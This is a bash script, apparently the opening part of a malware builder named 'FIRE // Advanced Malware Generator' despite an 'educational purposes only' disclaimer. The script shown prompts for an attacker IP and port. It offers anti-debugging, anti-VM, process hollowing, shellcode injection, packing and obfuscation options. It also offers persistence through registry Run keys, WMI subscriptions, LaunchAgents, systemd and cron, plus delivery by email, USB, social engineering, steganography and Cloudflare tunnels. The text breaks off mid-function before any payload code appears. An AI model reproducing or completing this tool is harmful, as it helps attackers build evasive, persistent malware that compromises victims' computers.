#!/bin/bash

# FIRE Educational Framework - Educational Version Only
# WARNING: This tool is for educational purposes only
# Unauthorized use is illegal and unethical

# Color codes
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
NC='\033[0m'
BOLD='\033[1m'

# Configuration
DEFAULT_ATTACKER_IP="127.0.0.1"
DEFAULT_ATTACKER_PORT="4444"
VENV_DIR="./fire_venv"
WORK_DIR="./fire_build"
FINAL_NAME_WIN="pc.exe"
FINAL_NAME_LIN="pc"
FINAL_NAME_MAC="pc_macos"
LOG_FILE="fire_generator.log"
MAX_LOG_SIZE=1048576
CONFIG_FILE=".fire_config"
TEMP_DIR="/tmp/fire_temp_$$"
DELIVERY_DIR="./fire_delivery"
CLOUDFLARED_DIR="./cloudflared"
IMAGES_DIR="./fire_images"
PLUGINS_DIR="./fire_plugins"

# Advanced configuration options
declare -A ENCRYPTION_ALGORITHMS=(
    ["1"]="AES-256-GCM"
    ["2"]="ChaCha20-Poly1305"
    ["3"]="Blowfish-CBC"
    ["4"]="Serpent-256-CBC"
    ["5"]="Twofish-CBC"
)
declare -A PERSISTENCE_METHODS=(
    ["1"]="registry"
    ["2"]="cron"
    ["3"]="launchd"
    ["4"]="systemd"
    ["5"]="startup_folder"
    ["6"]="wmi_subscription"
    ["7"]="windows_startup"
    ["8"]="macos_launchagent"
    ["9"]="linux_systemd"
)
declare -A OBFUSCATION_TECHNIQUES=(
    ["1"]="basic"
    ["2"]="intermediate"
    ["3"]="advanced"
    ["4"]="professional"
    ["5"]="military_grade"
)
declare -A PACKING_METHODS=(
    ["1"]="upx"
    ["2"]="mpress"
    ["3"]="custom"
    ["4"]="none"
)
declare -A DELIVERY_METHODS=(
    ["1"]="email"
    ["2"]="usb"
    ["3"]="web"
    ["4"]="network"
    ["5"]="social_engineering"
    ["6"]="bundle"
    ["7"]="cloudflare_tunnel"
    ["8"]="image_steganography"
)

# Global variables
SCRIPT_VERSION="8.2-Enhanced-Modular-CrossPlatform"
BUILD_TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
BUILD_ID=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)

# Configuration variables
ATTACKER_IP=""
ATTACKER_PORT=""
TARGET_OS=""
FINAL_NAME=""
PAYLOAD_TYPE=""
ENCRYPTION_ALGORITHM="AES-256-GCM"
OBFUSCATION_LEVEL=3
PERSISTENCE_METHOD="windows_startup"
ANTI_DEBUG_ENABLED=true
ANTI_VM_ENABLED=true
PACKER_ENABLED=true
PACKING_METHOD="upx"
SHELLCODE_INJECTION=true
PROCESS_HOLLOWING=true
RUNTIME_DECRYPTION=true
KEEP_BUILD_FILES="false"
DELIVERY_METHOD=""
DELIVERY_TARGETS=""
CLOUDFLARE_TUNNEL_ENABLED=false
CLOUDFLARE_TUNNEL_URL=""
CLOUDFLARE_TUNNEL_PORT="8080"
AUTO_EXECUTION=true
FAKE_GUI_ENABLED=true
AUTO_LAUNCH_METHOD="lnk"
PROGRESS_BAR_ENABLED=true
VERIFICATION_ENABLED=true

# Progress bar
show_progress() {
    local current=$1
    local total=$2
    local width=50
    local percentage=$((current * 100 / total))
    local completed=$((current * width / total))
    local remaining=$((width - completed))
    
    printf "\r${Y}[${NC}"
    printf "%*s" $completed | tr ' ' '='
    printf "%*s" $remaining | tr ' ' '-'
    printf "${Y}]${NC} ${G}%d%%${NC}" $percentage
    
    if [ $current -eq $total ]; then
        echo ""
    fi
}

# Enhanced error handling
handle_error() {
    local exit_code=$1
    local line_number=$2
    local command="$3"
    
    if [ $exit_code -ne 0 ]; then
        log_message "ERROR" "Command failed with exit code $exit_code at line $line_number: $command"
        echo -e "${R}[ERROR] Command failed: $command${NC}"
        echo -e "${R}[ERROR] Exit code: $exit_code${NC}"
        echo -e "${R}[ERROR] Line: $line_number${NC}"
        
        # Ask user if they want to continue
        read -p "Do you want to continue anyway? [y/N]: " choice
        if [[ ! "$choice" =~ ^[Yy]$ ]]; then
            log_message "CRITICAL" "User chose to exit after error"
            exit $exit_code
        fi
    fi
}

# Set up error trapping
set -E
trap 'handle_error $? $LINENO "$BASH_COMMAND"' ERR

# Plugin system
load_plugins() {
    if [ -d "$PLUGINS_DIR" ]; then
        log_message "INFO" "Loading plugins from $PLUGINS_DIR"
        for plugin in "$PLUGINS_DIR"/*.sh; do
            if [ -f "$plugin" ]; then
                log_message "INFO" "Loading plugin: $(basename "$plugin")"
                source "$plugin"
            fi
        done
    else
        log_message "INFO" "No plugins directory found, creating one"
        ensure_dir "$PLUGINS_DIR"
        
        # Create a sample plugin
        cat > "$PLUGINS_DIR/sample_plugin.sh" << 'EOF'
# Sample Plugin for FIRE Educational Framework
# This demonstrates how to create a custom payload type

# Register the new payload type
register_payload_type() {
    local payload_name="sample"
    local payload_description="Sample Payload for Demonstration"
    
    # Add to the global payload types array
    PAYLOAD_TYPES["$payload_name"]="$payload_description"
    
    # Define the function to create this payload type
    create_sample_payload() {
        local attacker_ip=$1
        local attacker_port=$2
        local encryption_key=$3
        local target_os=${4:-"Unknown"}
        
        cat > payload.py << SAMPLE_EOF
#!/usr/bin/env python3
import os
import sys
import time
import platform

def main():
    print("Sample payload running on", platform.system())
    time.sleep(2)

if __name__ == "__main__":
    main()
SAMPLE_EOF
        
        log_message "INFO" "Sample payload created"
    }
}

# Call the registration function
register_payload_type
EOF
    fi
}

# Enhanced platform detection
detect_platform() {
    case "$(uname -s)" in
        Linux*)     PLATFORM="Linux";;
        Darwin*)    PLATFORM="macOS";;
        CYGWIN*|MINGW*|MSYS*) PLATFORM="Windows";;
        *)          PLATFORM="Unknown";;
    esac
    echo "$PLATFORM"
}

# Cross-platform file operations
get_file_size() {
    local file_path="$1"
    if [ "$(detect_platform)" = "macOS" ]; then
        stat -f%z "$file_path" 2>/dev/null || echo "0"
    else
        stat -c%s "$file_path" 2>/dev/null || echo "0"
    fi
}

ensure_dir() {
    local dir_path="$1"
    if [ ! -d "$dir_path" ]; then
        mkdir -p "$dir_path"
        log_message "DEBUG" "Created directory: $dir_path"
    fi
}

set_executable() {
    local file_path="$1"
    chmod +x "$file_path" 2>/dev/null || log_message "WARNING" "Failed to set executable permission for $file_path"
}

get_temp_dir() {
    if [ "$(detect_platform)" = "Windows" ]; then
        echo "$TEMP/fire_temp_$$"
    else
        echo "/tmp/fire_temp_$$"
    fi
}

# Enhanced logging system
init_logging() {
    [ ! -f "$LOG_FILE" ] && touch "$LOG_FILE"
    
    if [ -f "$LOG_FILE" ] && [ $(get_file_size "$LOG_FILE") -gt $MAX_LOG_SIZE ]; then
        local archived_log="${LOG_FILE}.$(date +%Y%m%d_%H%M%S)"
        mv "$LOG_FILE" "$archived_log"
        gzip "$archived_log" &
        log_message "INFO" "Log file archived to $archived_log.gz"
    fi
}

log_message() {
    local level=$1
    local message=$2
    local timestamp=$(date +"%Y-%m-%d %T")
    local log_entry="[$timestamp] [$level] $message"
    
    echo "$log_entry" >> "$LOG_FILE"
    
    case $level in
        "CRITICAL") echo -e "${R}[CRITICAL]${NC} ${BOLD}$message${NC}" ;;
        "ERROR") echo -e "${R}[ERROR]${NC} ${BOLD}$message${NC}" ;;
        "WARNING") echo -e "${Y}[WARNING]${NC} $message${NC}" ;;
        "INFO") echo -e "${G}[INFO]${NC} $message${NC}" ;;
        "DEBUG") echo -e "${B}[DEBUG]${NC} $message${NC}" ;;
        "SUCCESS") echo -e "${G}[SUCCESS]${NC} ${BOLD}$message${NC}" ;;
        *) echo "[$level] $message" ;;
    esac
}

# Enhanced validation functions
validate_ip() {
    local ip="$1"
    
    [[ ! $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] && return 1
    
    IFS='.' read -ra ADDR <<< "$ip"
    for i in "${ADDR[@]}"; do
        [[ $i -gt 255 ]] || [[ $i -lt 0 ]] && return 1
    done
    
    [[ "$ip" == "0.0.0.0" ]] || [[ "$ip" == "255.255.255.255" ]] && return 1
    
    local first_octet=${ADDR[0]}
    local second_octet=${ADDR[1]}
    
    if [ "$first_octet" == "10" ] || 
       ([ "$first_octet" == "172" ] && [ "$second_octet" -ge 16 ] && [ "$second_octet" -le 31 ]) ||
       ([ "$first_octet" == "192" ] && [ "$second_octet" == "168" ]); then
        echo -e "${Y}[!] Warning: Using private IP address (${ip})${NC}"
        log_message "WARNING" "Using private IP address: $ip"
    fi
    
    return 0
}

validate_port() {
    local port="$1"
    
    [[ ! $port =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ] && return 1
    
    local reserved_ports=(20 21 22 23 25 53 80 110 143 443 993 995 1433 3306 3389 5432 5900)
    local service_names=("FTP" "SSH" "Telnet" "SMTP" "DNS" "HTTP" "POP3" "IMAP" "HTTPS" "IMAPS" "POP3S" "MSSQL" "MySQL" "RDP" "PostgreSQL" "VNC")
    
    for i in "${!reserved_ports[@]}"; do
        if [ "$port" -eq "${reserved_ports[$i]}" ]; then
            echo -e "${Y}[!] Warning: Port $port is commonly used for ${service_names[$i]}${NC}"
            log_message "WARNING" "Using reserved port: $port (${service_names[$i]})"
            break
        fi
    done
    
    return 0
}

# Enhanced banner display
display_banner() {
    clear
    
    local os_info=$(uname -s)
    local kernel_info=$(uname -r)
    local arch_info=$(uname -m)
    local cpu_info=$(grep 'model name' /proc/cpuinfo | head -1 | cut -d':' -f2 | xargs 2>/dev/null || echo "Unknown")
    local mem_info=$(free -h | grep '^Mem:' | awk '{print $2}' 2>/dev/null || echo "Unknown")
    local disk_info=$(df -h / | tail -1 | awk '{print $4}' 2>/dev/null || echo "Unknown")
    
    printf '%s\n' "╔══════════════════════════════════════════════════════════╗"
    printf '%s\n' "║  __      __  _    _  _        _____            _   _          ║"
    printf '%s\n' "║  \ \    / / | |  | || |      / ____|    /\    | \ | |         ║"
    printf '%s\n' "║   \ \  / /  | |  | || |     | |        /  \   |  \| |         ║"
    printf '%s\n' "║    \ \/ /   | |  | || |     | |       / /\ \  | . \` |         ║"
    printf '%s\n' "║     \  /    | |__| || |____ | |____  / ____ \ | |\  |         ║"
    printf '%s\n' "║      \/      \____/ |______| \_____|/_/    \_\|_| \_|         ║"
    printf '%s\n' "║                                                              ║"
    printf '%s\n' "║    [ FIRE // Advanced Malware Generator v$SCRIPT_VERSION ]       ║"
    printf '%s\n' "║                                                              ║"
    printf '%s\n' "║    [ Build ID: $BUILD_ID | Timestamp: $BUILD_TIMESTAMP ]      ║"
    printf '%s\n' "╚══════════════════════════════════════════════════════════╝"
    
    echo -e "\n${B}SYSTEM INFORMATION:${NC}"
    echo -e "${Y}OS:${NC} $os_info $kernel_info"
    echo -e "${Y}Architecture:${NC} $arch_info"
    echo -e "${Y}CPU:${NC} $cpu_info"
    echo -e "${Y}Memory:${NC} $mem_info"
    echo -e "${Y}Free Disk:${NC} $disk_info"
    echo -e "${Y}Build ID:${NC} $BUILD_ID"
    echo -e "${Y}Timestamp:${NC} $BUILD_TIMESTAMP"
    
    # Check for updates
    echo -e "\n${B}UPDATE STATUS:${NC}"
    if [ -f ".fire_last_update" ]; then
        local last_update=$(cat ".fire_last_update")
        local days_since_update=$(( ($(date +%s) - $(date -d "$last_update" +%s)) / 86400 ))
        
        if [ $days_since_update -gt 7 ]; then
            echo -e "${Y}Last update check: $last_update (${days_since_update} days ago)${NC}"
            echo -e "${Y}Consider checking for updates with --check-updates${NC}"
        else
            echo -e "${G}Last update check: $last_update${NC}"
        fi
    else
        echo -e "${Y}No update check performed yet${NC}"
    fi
    
    echo -e "\n${R}WARNING: This tool is for educational purposes only.${NC}"
    echo -e "${R}Unauthorized use is illegal and unethical.${NC}\n"
}

# Enhanced dependency checking
check_dependencies() {
    log_message "INFO" "Checking dependencies..."
    
    local missing_deps=()
    local outdated_deps=()
    local optional_deps=()
    local total_deps=8
    local checked_deps=0
    
    if ! command -v python3 &> /dev/null; then
        missing_deps+=("python3")
    else
        local python_version=$(python3 --version 2>&1 | cut -d' ' -f2)
        local python_major=$(echo $python_version | cut -d'.' -f1)
        local python_minor=$(echo $python_version | cut -d'.' -f2)
        
        if [ "$python_major" -lt 3 ] || ([ "$python_major" -eq 3 ] && [ "$python_minor" -lt 7 ]); then
            outdated_deps+=("python3 (version >= 3.7 required, found $python_version)")
        else
            log_message "DEBUG" "Python version OK: $python_version"
        fi
    fi
    
    checked_deps=$((checked_deps + 1))
    [ "$PROGRESS_BAR_ENABLED" = true ] && show_progress $checked_deps $total_deps
    
    if ! command -v pip &> /dev/null && ! command -v pip3 &> /dev/null; then
        missing_deps+=("pip")
    else
        local pip_version=$(pip --version 2>/dev/null | cut -d' ' -f2 || pip3 --version 2>/dev/null | cut -d' ' -f2)
        log_message "DEBUG" "Pip version: $pip_version"
    fi
    
    checked_deps=$((checked_deps + 1))
    [ "$PROGRESS_BAR_ENABLED" = true ] && show_progress $checked_deps $total_deps
    
    if ! command -v git &> /dev/null; then
        optional_deps+=("git (recommended for version control)")
    fi
    
    checked_deps=$((checked_deps + 1))
    [ "$PROGRESS_BAR_ENABLED" = true ] && show_progress $checked_deps $total_deps
    
    if ! command -v upx &> /dev/null; then
        optional_deps+=("upx (recommended for executable compression)")
    fi
    
    checked_deps=$((checked_deps + 1))
    [ "$PROGRESS_BAR_ENABLED" = true ] && show_progress $checked_deps $total_deps
    
    if ! command -v sendmail &> /dev/null; then
        optional_deps+=("sendmail (for email delivery)")
    fi
    
    checked_deps=$((checked_deps + 1))
    [ "$PROGRESS_BAR_ENABLED" = true ] && show_progress $checked_deps $total_deps
    
    if ! command -v ssh &> /dev/null; then
        optional_deps+=("ssh (for network delivery)")
    fi
    
    checked_deps=$((checked_deps + 1))
    [ "$PROGRESS_BAR_ENABLED" = true ] && show_progress $checked_deps $total_deps
    
    if ! command -v wget &> /dev/null && ! command -v curl &> /dev/null; then
        optional_deps+=("wget or curl (for downloading cloudflared)")
    fi
    
    checked_deps=$((checked_deps + 1))
    [ "$PROGRESS_BAR_ENABLED" = true ] && show_progress $checked_deps $total_deps
    
    # Check for image manipulation tools
    if ! command -v convert &> /dev/null; then
        optional_deps+=("ImageMagick (for image steganography)")
    fi
    
    checked_deps=$((checked_deps + 1))
    [ "$PROGRESS_BAR_ENABLED" = true ] && show_progress $checked_deps $total_deps
    
    if [ ${#missing_deps[@]} -ne 0 ] || [ ${#outdated_deps[@]} -ne 0 ]; then
        echo -e "\n${R}[!] Critical dependencies missing or outdated:${NC}"
        
        for dep in "${missing_deps[@]}"; do
            echo -e "${R}    Missing: $dep${NC}"
        done
        
        for dep in "${outdated_deps[@]}"; do
            echo -e "${Y}    Outdated: $dep${NC}"
        done
        
        echo -e "\n${Y}[*] Please install/update missing dependencies and try again.${NC}"
        log_message "ERROR" "Missing/outdated dependencies: ${missing_deps[*]} ${outdated_deps[*]}"
        exit 1
    fi
    
    if [ ${#optional_deps[@]} -ne 0 ]; then
        echo -e "\n${Y}[!] Optional dependencies not found (not critical):${NC}"
        for dep in "${optional_deps[@]}"; do
            echo -e "${Y}    $dep${NC}"
        done
    fi
    
    log_message "SUCCESS" "All critical dependencies are installed and up to date"
}

# Enhanced cloudflared setup
setup_cloudflared() {
    log_message "INFO" "Setting up Cloudflare tunnel..."
    
    ensure_dir "$CLOUDFLARED_DIR"
    
    local cloudflared_binary="$CLOUDFLARED_DIR/cloudflared"
    local arch=$(uname -m)
    local os=$(uname -s | tr '[:upper:]' '[:lower:]')
    
    # Determine correct binary for architecture
    case "$arch" in
        x86_64) arch="amd64" ;;
        aarch64|arm64) arch="arm64" ;;
        armv7l) arch="arm" ;;
        *) arch="amd64" ;;
    esac
    
    # Determine correct binary for OS
    case "$os" in
        linux) os="linux" ;;
        darwin) os="darwin" ;;
        windows) os="windows" ;;
        *) os="linux" ;;
    esac
    
    local cloudflared_url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${os}-${arch}"
    
    # Download cloudflared if not present
    if [ ! -f "$cloudflared_binary" ]; then
        echo -e "${Y}[*] Downloading cloudflared...${NC}"
        
        if command -v wget &> /dev/null; then
            wget -q "$cloudflared_url" -O "$cloudflared_binary"
        elif command -v curl &> /dev/null; then
            curl -sL "$cloudflared_url" -o "$cloudflared_binary"
        else
            log_message "ERROR" "Neither wget nor curl is available to download cloudflared"
            return 1
        fi
        
        if [ $? -ne 0 ]; then
            log_message "ERROR" "Failed to download cloudflared"
            return 1
        fi
        
        set_executable "$cloudflared_binary"
        log_message "SUCCESS" "cloudflared downloaded successfully"
    else
        log_message "INFO" "cloudflared already exists"
        
        # Check for updates
        local current_version=$("$cloudflared_binary" --version 2>/dev/null | cut -d' ' -f2)
        if [ -n "$current_version" ]; then
            log_message "INFO" "cloudflared version: $current_version"
            
            # Check for updates (simplified)
            echo -e "${Y}[*] Checking for cloudflared updates...${NC}"
            if command -v curl &> /dev/null; then
                local latest_version=$(curl -s "https://api.github.com/repos/cloudflare/cloudflared/releases/latest" | grep -o '"tag_name": "[^"]*' | cut -d'"' -f4)
                if [ "$latest_version" != "v$current_version" ]; then
                    echo -e "${Y}[*] New cloudflared version available: $latest_version (current: v$current_version)${NC}"
                    read -p "Do you want to update cloudflared? [y/N]: " update_choice
                    if [[ "$update_choice" =~ ^[Yy]$ ]]; then
                        rm -f "$cloudflared_binary"
                        setup_cloudflared
                        return $?
                    fi
                else
                    echo -e "${G}[*] cloudflared is up to date${NC}"
                fi
            fi
        fi
    fi
    
    # Verify cloudflared is working
    if "$cloudflared_binary" --version &> /dev/null; then
        return 0
    else
        log_message "ERROR" "cloudflared binary is not working"
        return 1
    fi
}

# Enhanced cloudflare tunnel management
start_cloudflare_tunnel() {
    local local_port=$1
    local tunnel_dir=$2
    
    log_message "INFO" "Starting Cloudflare tunnel on port $local_port..."
    
    # Start cloudflared tunnel in background
    local tunnel_log="$TEMP_DIR/tunnel.log"
    local cloudflared_binary="$CLOUDFLARED_DIR/cloudflared"
    
    # Try to start a temporary tunnel without authentication
    "$cloudflared_binary" tunnel --url "http://localhost:$local_port" --logfile "$tunnel_log" &
    local tunnel_pid=$!
    
    # Wait for tunnel to initialize with progress indicator
    echo -e "${Y}[*] Initializing tunnel...${NC}"
    for i in {1..8}; do
        sleep 1
        [ "$PROGRESS_BAR_ENABLED" = true ] && show_progress $i 8
    done
    
    # Extract tunnel URL from log with improved pattern matching
    if [ -f "$tunnel_log" ]; then
        local tunnel_url=$(grep -o 'https://[^[:space:]]*\.trycloudflare\.com' "$tunnel_log" | head -1)
        if [ -n "$tunnel_url" ]; then
            CLOUDFLARE_TUNNEL_URL="$tunnel_url"
            echo "$tunnel_pid" > "$TEMP_DIR/tunnel.pid"
            log_message "SUCCESS" "Cloudflare tunnel started: $CLOUDFLARE_TUNNEL_URL"
            return 0
        fi
    fi
    
    # Fallback: try to get URL from process output
    sleep 5
    tunnel_url=$(ps aux | grep cloudflared | grep -o 'https://[^[:space:]]*\.trycloudflare\.com' | head -1)
    if [ -n "$tunnel_url" ]; then
        CLOUDFLARE_TUNNEL_URL="$tunnel_url"
        echo "$tunnel_pid" > "$TEMP_DIR/tunnel.pid"
        log_message "SUCCESS" "Cloudflare tunnel started: $CLOUDFLARE_TUNNEL_URL"
        return 0
    fi
    
    # Last resort: try to extract from the log with more patterns
    sleep 2
    if [ -f "$tunnel_log" ]; then
        tunnel_url=$(grep -o 'https://[^[:space:]]*' "$tunnel_log" | grep trycloudflare | head -1)
        if [ -n "$tunnel_url" ]; then
            CLOUDFLARE_TUNNEL_URL="$tunnel_url"
            echo "$tunnel_pid" > "$TEMP_DIR/tunnel.pid"
            log_message "SUCCESS" "Cloudflare tunnel started: $CLOUDFLARE_TUNNEL_URL"
            return 0
        fi
    fi
    
    log_message "ERROR" "Failed to start Cloudflare tunnel"
    return 1
}

stop_cloudflare_tunnel() {
    if [ -f "$TEMP_DIR/tunnel.pid" ]; then
        local tunnel_pid=$(cat "$TEMP_DIR/tunnel.pid")
        if kill -0 "$tunnel_pid" 2>/dev/null; then
            kill "$tunnel_pid"
            log_message "INFO" "Cloudflare tunnel stopped"
        fi
        rm -f "$TEMP_DIR/tunnel.pid"
    fi
}

# Enhanced environment setup
setup_environment() {
    log_message "INFO" "Setting up environment..."
    
    # Use cross-platform temp directory
    TEMP_DIR=$(get_temp_dir)
    ensure_dir "$TEMP_DIR"
    ensure_dir "$DELIVERY_DIR"
    ensure_dir "$IMAGES_DIR"
    
    if [ ! -d "$VENV_DIR" ]; then
        echo -e "${Y}[*] Creating isolated Python environment...${NC}"
        if ! python3 -m venv "$VENV_DIR" --system-site-packages; then
            log_message "ERROR" "Failed to create virtual environment"
            exit 1
        fi
        log_message "SUCCESS" "Virtual environment created"
    else
        log_message "INFO" "Using existing virtual environment"
    fi
    
    # Cross-platform virtual environment activation
    if [ "$(detect_platform)" = "Windows" ]; then
        if ! source "$VENV_DIR/Scripts/activate"; then
            log_message "ERROR" "Failed to activate virtual environment"
            exit 1
        fi
    else
        if ! source "$VENV_DIR/bin/activate"; then
            log_message "ERROR" "Failed to activate virtual environment"
            exit 1
        fi
    fi
    
    echo -e "${Y}[*] Upgrading pip and setuptools...${NC}"
    if ! pip install --quiet --upgrade pip setuptools wheel; then
        log_message "WARNING" "Failed to upgrade pip/setuptools"
    fi
    
    local required_packages=("pyinstaller" "cryptography" "requests" "psutil" "pefile" "yara-python" "flask" "pillow" "stegano")
    local total_packages=${#required_packages[@]}
    local installed_packages=0
    
    for package in "${required_packages[@]}"; do
        if ! python3 -c "import ${package//-/_}" &> /dev/null; then
            echo -e "${Y}[*] Installing $package...${NC}"
            if ! pip install --quiet "$package"; then
                log_message "ERROR" "Failed to install $package"
                exit 1
            fi
            log_message "SUCCESS" "$package installed"
        else
            log_message "DEBUG" "$package already installed"
        fi
        
        installed_packages=$((installed_packages + 1))
        [ "$PROGRESS_BAR_ENABLED" = true ] && show_progress $installed_packages $total_packages
    done
    
    ensure_dir "$WORK_DIR"
    if ! cd "$WORK_DIR"; then
        log_message "ERROR" "Failed to create/access work directory"
        exit 1
    fi
    
    pip freeze > requirements.txt
    log_message "INFO" "Requirements saved to requirements.txt"
    
    log_message "SUCCESS" "Environment setup complete"
}

# Enhanced configuration management
get_configuration() {
    echo -e "${B}CONFIGURATION:${NC}"
    
    while true; do
        read -p "Enter attacker IP address [default: $DEFAULT_ATTACKER_IP]: " ATTACKER_IP
        ATTACKER_IP=${ATTACKER_IP:-$DEFAULT_ATTACKER_IP}
        
        if validate_ip "$ATTACKER_IP" || [ "$ATTACKER_IP" == "$DEFAULT_ATTACKER_IP" ]; then
            log_message "INFO" "Using attacker IP: $ATTACKER_IP"
            break
        else
            echo -e "${R}[!] Invalid IP address format. Please try again.${NC}"
        fi
    done

    while true; do
        read -p "Enter attacker port [default: $DEFAULT_ATTACKER_PORT]: " ATTACKER_PORT
        ATTACKER_PORT=${ATTACKER_PORT:-$DEFAULT_ATTACKER_PORT}
        
        if validate_port "$ATTACKER_PORT" || [ "$ATTACKER_PORT" == "$DEFAULT_ATTACKER_PORT" ]; then
            log_message "INFO" "Using attacker port: $ATTACKER_PORT"
            break
        else
            echo -e "${R}[!] Invalid port number. Please enter a value between 1-65535.${NC}"
        fi
    done

    read -p "Configure advanced options? [y/N]: " adv_config
    if [[ "$adv_config" =~ ^[Yy]$ ]]; then
        advanced_config
    fi

    echo -e "\n${B}SELECT TARGET OPERATING SYSTEM:${NC}"
    echo "1) Windows"
    echo "2) Linux"
    echo "3) macOS"
    echo "4) Multi-OS (auto-detect target OS and execute appropriate payload)"
    while true; do
        read -p ">> " os_choice
        case $os_choice in
            1)
                TARGET_OS="Windows"
                FINAL_NAME="$FINAL_NAME_WIN"
                log_message "INFO" "Target OS selected: Windows"
                break
                ;;
            2)
                TARGET_OS="Linux"
                FINAL_NAME="$FINAL_NAME_LIN"
                log_message "INFO" "Target OS selected: Linux"
                break
                ;;
            3)
                TARGET_OS="macOS"
                FINAL_NAME="$FINAL_NAME_MAC"
                log_message "INFO" "Target OS selected: macOS"
                break
                ;;
            4)
                TARGET_OS="Multi-OS"
                # Set appropriate filename based on current platform
                case "$(detect_platform)" in
                    "Windows")
                        FINAL_NAME="$FINAL_NAME_WIN"
                        ;;
                    "Linux")
                        FINAL_NAME="$FINAL_NAME_LIN"
                        ;;
                    "macOS")
                        FINAL_NAME="$FINAL_NAME_MAC"
                        ;;
                    *)
                        FINAL_NAME="$FINAL_NAME_LIN"
                        ;;
                esac
                log_message "INFO" "Target OS selected: Multi-OS (auto-detect on target)"
                break
                ;;
            *)
                echo -e "${R}[!] Invalid OS choice. Please enter 1-4.${NC}"
                ;;
        esac
    done

    # Get available payload types including plugins
    get_available_payload_types
    
    echo -e "\n${B}SELECT PAYLOAD TYPE:${NC}"
    for i in "${!PAYLOAD_LIST[@]}"; do
        echo "$i) ${PAYLOAD_LIST[$i]}"
    done
    
    local max_payload_type=${#PAYLOAD_LIST[@]}
    
    while true; do
        read -p ">> " payload_choice
        if [[ "$payload_choice" =~ ^[0-9]+$ ]] && [ "$payload_choice" -ge 1 ] && [ "$payload_choice" -le "$max_payload_type" ]; then
            PAYLOAD_TYPE="$payload_choice"
            log_message "INFO" "Payload type selected: $payload_choice - ${PAYLOAD_LIST[$((payload_choice-1))]}"
            break
        else
            echo -e "${R}[!] Invalid payload type. Please enter a number between 1-$max_payload_type.${NC}"
        fi
    done

    read -p "Enter custom filename (leave empty for default): " CUSTOM_NAME
    if [ -n "$CUSTOM_NAME" ]; then
        if [ "$TARGET_OS" == "Windows" ] && [[ ! "$CUSTOM_NAME" =~ \.exe$ ]]; then
            CUSTOM_NAME="${CUSTOM_NAME}.exe"
        fi
        FINAL_NAME="$CUSTOM_NAME"
        log_message "INFO" "Using custom filename: $FINAL_NAME"
    fi

    # Auto-execution configuration
    echo -e "\n${B}AUTO-EXECUTION CONFIGURATION:${NC}"
    read -p "Enable auto-execution on installation? [Y/n]: " auto_exec
    AUTO_EXECUTION=true
    if [[ "$auto_exec" =~ ^[Nn]$ ]]; then
        AUTO_EXECUTION=false
    fi
    
    if [ "$AUTO_EXECUTION" = true ]; then
        echo -e "${Y}[*] Auto-execution will be enabled for this payload.${NC}"
        log_message "INFO" "Auto-execution enabled"
        
        # Enhanced persistence method selection based on OS
        echo -e "\n${B}SELECT PERSISTENCE METHOD:${NC}"
        if [ "$TARGET_OS" == "Windows" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
            echo "1) Windows Registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)"
            echo "2) Windows Startup Folder (C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp)"
            echo "3) WMI Event Subscription"
            echo "4) Scheduled Task"
            echo "5) LNK File (Desktop Shortcut)"
            echo "6) Shell Extension (Context Menu)"
        elif [ "$TARGET_OS" == "Linux" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
            echo "7) Cron Job"
            echo "8) Systemd Service (/lib/systemd/system/)"
            echo "9) Init.d Script"
            echo "10) Profile Modification"
            echo "11) Desktop Shortcut (.desktop)"
        elif [ "$TARGET_OS" == "macOS" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
            echo "12) LaunchAgent (/Library/LaunchAgents/)"
            echo "13) LaunchDaemon (/Library/LaunchDaemons/)"
            echo "14) Login Item"
            echo "15) Cron Job"
            echo "16) Dock Shortcut"
        fi
        
        while true; do
            read -p ">> " pers_choice
            if [ "$TARGET_OS" == "Windows" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
                case $pers_choice in
                    1) PERSISTENCE_METHOD="registry"; AUTO_LAUNCH_METHOD="registry"; break ;;
                    2) PERSISTENCE_METHOD="windows_startup"; AUTO_LAUNCH_METHOD="startup"; break ;;
                    3) PERSISTENCE_METHOD="wmi_subscription"; AUTO_LAUNCH_METHOD="wmi"; break ;;
                    4) PERSISTENCE_METHOD="scheduled_task"; AUTO_LAUNCH_METHOD="task"; break ;;
                    5) PERSISTENCE_METHOD="lnk_file"; AUTO_LAUNCH_METHOD="lnk"; break ;;
                    6) PERSISTENCE_METHOD="shell_extension"; AUTO_LAUNCH_METHOD="shell"; break ;;
                    *) echo -e "${R}[!] Invalid choice. Please enter 1-6.${NC}" ;;
                esac
            elif [ "$TARGET_OS" == "Linux" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
                case $pers_choice in
                    7) PERSISTENCE_METHOD="cron"; AUTO_LAUNCH_METHOD="cron"; break ;;
                    8) PERSISTENCE_METHOD="linux_systemd"; AUTO_LAUNCH_METHOD="systemd"; break ;;
                    9) PERSISTENCE_METHOD="init_script"; AUTO_LAUNCH_METHOD="init"; break ;;
                    10) PERSISTENCE_METHOD="profile_mod"; AUTO_LAUNCH_METHOD="profile"; break ;;
                    11) PERSISTENCE_METHOD="desktop_shortcut"; AUTO_LAUNCH_METHOD="desktop"; break ;;
                    *) echo -e "${R}[!] Invalid choice. Please enter 7-11.${NC}" ;;
                esac
            elif [ "$TARGET_OS" == "macOS" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
                case $pers_choice in
                    12) PERSISTENCE_METHOD="macos_launchagent"; AUTO_LAUNCH_METHOD="launchagent"; break ;;
                    13) PERSISTENCE_METHOD="macos_launchdaemon"; AUTO_LAUNCH_METHOD="launchdaemon"; break ;;
                    14) PERSISTENCE_METHOD="login_item"; AUTO_LAUNCH_METHOD="login"; break ;;
                    15) PERSISTENCE_METHOD="cron"; AUTO_LAUNCH_METHOD="cron"; break ;;
                    16) PERSISTENCE_METHOD="dock_shortcut"; AUTO_LAUNCH_METHOD="dock"; break ;;
                    *) echo -e "${R}[!] Invalid choice. Please enter 12-16.${NC}" ;;
                esac
            fi
        done
        
        log_message "INFO" "Persistence method selected: $PERSISTENCE_METHOD"
    else
